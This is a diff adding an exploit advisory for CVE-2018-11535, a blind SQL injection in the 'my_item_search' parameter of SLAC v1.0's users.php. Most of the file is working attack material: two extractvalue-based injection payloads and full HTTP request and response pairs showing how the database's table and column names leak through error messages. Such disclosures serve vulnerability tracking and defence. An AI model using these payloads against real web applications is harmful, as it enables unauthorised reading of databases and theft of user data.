@@ -1,0 +1,85 @@
+# # # # # 
+# Exploit Title: SLAC v1.0: Blind SQL Injection / XPath Injection
+# Date: 29-05-2018
+# Vendor Homepage: https://sitemakin.com/login-script-demo
+# Exploit Author: Divya Jain
+# Version: v1.0
+# CVE: CVE-2018-11535
+# Category: Webapps
+# Severity: High
+# Tested on: KaLi LinuX_x64
+# # # # #
+
+# Proof of Concept:
+        ////////////////////////////////////////////////
+          SQL Injection in "my_item_search" parameter
+       ////////////////////////////////////////////////
+    
+	# Affected Link: demo.com/login-script-demo/users.php
+	
+	# Parameter "my_item_search" is exploitable using xpath injection
+	
+	# Payload 1: 
+	my_item_search=1337'and extractvalue(5566,concat(0x7e,(select  table_name from information_schema.tables where table_schema=database() LIMIT 0,1),0x7e ))-- -
+	# Payload 2:
+	my_item_search=1337'and extractvalue(5566,concat(0x7e,(select  column_name from information_schema.columns where table_name="access_level" LIMIT 0,1),0x7e ))-- -
+	
+# POC 1 (Result: Table_name)
+/////////REQUEST//////////
+
+		POST /login-script-demo/users.php HTTP/1.1
+		Host: sitemakin.com
+		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
+		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+		Accept-Language: en-US,en;q=0.5
+		Accept-Encoding: gzip, deflate
+		Referer: https://demo.com/login-script-demo/users.php
+		Content-Type: application/x-www-form-urlencoded
+		Content-Length: 171
+		Cookie: PHPSESSID=57a62feb015f8912f7eaa856166343db; _ga=GA1.2.496857143.1527491400; _gid=GA1.2.909440178.1527491400; _gat=1
+		Connection: close
+		Upgrade-Insecure-Requests: 1
+
+		my_item_search=1337'and extractvalue(5566,concat(0x7e,(select  table_name from information_schema.tables where table_schema=database() LIMIT 0,1),0x7e ))-- -&submit=Search
+
+/////////RESPONSE//////////
+
+		<form method="post" action="/login-script-demo/users.php">
+		<select class="new-url2 form-control" name="my_item">
+		<br />
+		<b>Warning</b>:  PDOStatement::execute(): SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~access_level~' in <b>/home/sitemakin/public_html/login-script-demo/includes/post_users.inc.php</b> on line <b>33</b><br />
+		<br />
+		<b>Warning</b>:  main(): SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~access_level~' in <b>/home/sitemakin/public_html/login-script-demo/includes/post_users.inc.php</b> on line <b>34</b><br />
+				 <option value="all">All</option>
+
+
+
+# POC 2 (Result: Column_name)
+/////////REQUEST//////////
+
+		POST /login-script-demo/users.php HTTP/1.1
+		Host: sitemakin.com
+		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
+		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+		Accept-Language: en-US,en;q=0.5
+		Accept-Encoding: gzip, deflate
+		Referer: https://demo.com/login-script-demo/users.php
+		Content-Type: application/x-www-form-urlencoded
+		Content-Length: 175
+		Cookie: PHPSESSID=57a62feb015f8912f7eaa856166343db; _ga=GA1.2.496857143.1527491400; _gid=GA1.2.909440178.1527491400; _gat=1
+		Connection: close
+		Upgrade-Insecure-Requests: 1
+
+		my_item_search=1337'and extractvalue(5566,concat(0x7e,(select  column_name from information_schema.columns where table_name="access_level" LIMIT 0,1),0x7e ))-- -&submit=Search
+
+/////////RESPONSE//////////
+
+		<form method="post" action="/login-script-demo/users.php">
+		<select class="new-url2 form-control" name="my_item">
+		<br />
+		<b>Warning</b>:  PDOStatement::execute(): SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~id~' in <b>/home/sitemakin/public_html/login-script-demo/includes/post_users.inc.php</b> on line <b>33</b><br />
+		<br />
+		<b>Warning</b>:  main(): SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~id~' in <b>/home/sitemakin/public_html/login-script-demo/includes/post_users.inc.php</b> on line <b>34</b><br />
+				 <option value="all">All</option>
+				 
+################################################################################
